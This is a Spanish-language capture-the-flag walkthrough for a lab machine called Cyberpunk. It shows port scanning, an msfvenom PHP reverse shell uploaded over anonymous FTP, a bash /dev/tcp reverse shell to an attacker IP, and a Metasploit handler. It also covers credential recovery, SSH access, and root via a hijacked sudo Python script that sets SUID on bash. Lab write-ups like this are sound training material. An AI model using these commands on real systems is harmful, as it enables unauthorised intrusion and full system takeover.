---
tags:
  - Cybersecurity
  - Labs
  - TheHackerLabs
  - Easy
  - Linux
  - HTTP
  - FuzzingWeb
  - FTP
  - ReverseShell
  - SSH
  - PrivilegeEscalation
  - Sudo
  - Hijack
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#FTP|FTP]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]

---
# Resolviendo la máquina Cyberpunk

>En esta publicación, comparto cómo resolví la máquina **Cyberpunk** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/26).

---
## Enumeración
### Ping

`ping -c 1 192.168.1.40`

![[Pasted image 20250802193434.png]]

*TTL=63* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.40 -oG allPorts`

![[Pasted image 20250802193514.png]]

`nmap -p21,22,80 -sCV 192.168.1.40 -oN targeted`

![[Pasted image 20250802193548.png]]
![[Pasted image 20250802193610.png]]
### HTTP

`http://192.168.1.40/`

![[Pasted image 20250802193641.png]]
#### Fuzzing Web

`dirb http://192.168.1.40`

![[Pasted image 20250802193805.png]]

`gobuster dir -u http://192.168.1.40 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250802193830.png]]

---
## Explotación
### FTP

Se observa en la enumeración que el servicio **FTP** (puerto 21) se encuentra abierto, además de tener el inicio de sesión con el usuario anónimo activado.

`ftp 192.168.1.40`

![[Pasted image 20250802194117.png]]

Se encuentran los siguientes archivos:
- `index.html`.
- `secret.txt`.

Se procede a descargar el archivo `secret.txt`.

`get secret.txt`

`cat secret.txt`

![[Pasted image 20250802194250.png]]

Se genera un *payload malicioso*.

`msfvenom -p php/reverse_php LHOST=192.168.1.127 LPORT=1234 -f raw > pwned.php`

Se sube el archivo generado.

`put pwned.php`

`ls`

![[Pasted image 20250802194525.png]]
### Reverse Shell

Se inicia una escucha en el puerto 1234 para recibir la *reverse shell*.

`nc -nlvp 1234`

`http://192.168.1.40/pwned.php`

`sh -i >& /dev/tcp/192.168.1.127/1235 0>&1`

Se establece una nueva escucha en el puerto 1235 con el objetivo de mantener una sesión persistente mediante una segunda *reverse shell*.

`vim handler.rc`

```
use multi/handler
set PAYLOAD php/reverse_php
set LHOST 192.168.1.127
set LPORT 1235
run
```

`msfconsole -r handler.rc`

![[Pasted image 20250802195700.png]]

`background`

`sessions -u 1`

`sessions 2`

`sysinfo`

![[Pasted image 20250802195804.png]]

`getuid`

![[Pasted image 20250802195829.png]]

Se busca usuarios.

`cat /etc/passwd`

![[Pasted image 20250802202734.png]]

Se identifica el usuario `arasaka`.

Se buscan archivos que puedan contener información útil.

`find / -name *.txt 2>/dev/null`

![[Pasted image 20250802202748.png]]

`cd /opt`

`cat arasaka.txt`

![[Pasted image 20250802202820.png]]

Con [Cipher Identifier](https://www.dcode.fr/cipher-identifier) se identifica el *hash*: **Brainfuck**.

![[Pasted image 20250802202934.png]]

Se desencripta con [Brainfuck Translator](https://md5decrypt.net/en/Brainfuck-translator/).

![[Pasted image 20250802203035.png]]

Se encuentra la contraseña `cyberpunk2077`, del usuario `arasaka`.
### SSH

Se accede al servicio **SSH** (puerto 22) con el usuario y contraseña encontrados anteriormente.

`ssh arasaka@192.168.1.40`

![[Pasted image 20250802203210.png]]
### Escalada de Privilegios
#### Sudo

`sudo -l`

![[Pasted image 20250802210920.png]]

`cat randombase64.py`

![[Pasted image 20250802211008.png]]

Al tener acceso como el usuario `arasaka`, es posible modificar archivos dentro de su directorio `/home/arasaka`.

Se renombra el archivo `randombase64.py`.

`mv randombase64.py prueba.py`

Se crea el archivo `randombase64.py`.

`nano randombase64.py`

```
import base64
import os

message = input("Enter your string: ")
message_bytes = message.encode("ascii")
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode("ascii")

print(base64_message)

os.system("chmod u+s /bin/bash")
```

Se ejecuta el archivo.

`sudo /usr/bin/python3.11 /home/arasaka/randombase64.py`

![[Pasted image 20250803075105.png]]

`bash -p`

![[Pasted image 20250803075353.png]]

---